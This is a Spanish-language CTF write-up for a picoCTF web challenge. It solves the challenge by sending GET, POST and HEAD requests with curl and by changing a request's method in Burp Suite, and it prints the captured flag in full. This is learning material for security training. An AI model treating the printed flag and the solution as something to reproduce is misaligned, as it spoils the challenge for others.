## Descripción 
Find the flag being held on this server to get ahead of the competition [http://mercury.picoctf.net:53554/](http://mercury.picoctf.net:53554/)

Hint:
1. Maybe you have more than 2 choices
2. Check out tools like Burpsuite to modify your requests and look at the responses
## Solución 1

Con consola linux

Nos dice el hint 1 que tal vez tengamos más de 2 opciones
La primera usamos el comando de curl -X GET y la url de la página
La segunda usamos el comando de curl -X POST y la url de la página
La tercera usamos el comando de curl -X HEAD y la url de la página y en esta última nos da la bandera

```
vSalazarZ-picoctf@webshell:~$ curl -X GET http://mercury.picoctf.net:53554/

vSalazarZ-picoctf@webshell:~$ curl -X POST http://mercury.picoctf.net:53554/

vSalazarZ-picoctf@webshell:~$ curl -X HEAD http://mercury.picoctf.net:53554/
Warning: Setting custom HTTP method to HEAD with -X/--request may not work the 
Warning: way you want. Consider using -I/--head instead.

vSalazarZ-picoctf@webshell:~$ curl -I http://mercury.picoctf.net:53554/
HTTP/1.1 200 OK
flag: picoCTF{r3j3ct_th3_du4l1ty_2e5ba39f}
Content-type: text/html; charset=UTF-8

vSalazarZ-picoctf@webshell:~$ 

flag: picoCTF{r3j3ct_th3_du4l1ty_2e5ba39f}

```

## Solución 2

Usando Burpsuite

Abrimos la aplicación de Burpsuite y configuramos el proxy en settings, después configuramos el proxy en el navegador, activamos el proxy en intercept---intercept on y le damos a la página al botón de "blue", interceptamos la petición y modificamos el POST por HEAD y nos da la bandera

```
REQUEST: 
POST /index.php? HTTP/1.1
Host: mercury.picoctf.net:53554
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://mercury.picoctf.net:53554/
Accept-Encoding: gzip, deflate, br
Accept-Language: en
Connection: keep-alive

EDITED REQUEST:
HEAD /index.php? HTTP/1.1
Host: mercury.picoctf.net:53554
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://mercury.picoctf.net:53554/
Accept-Encoding: gzip, deflate, br
Accept-Language: en
Connection: keep-alive

RESPONSE:
HTTP/1.1 200 OK
flag: picoCTF{r3j3ct_th3_du4l1ty_2e5ba39f}
Content-type: text/html; charset=UTF-8

flag: picoCTF{r3j3ct_th3_du4l1ty_2e5ba39f}

```

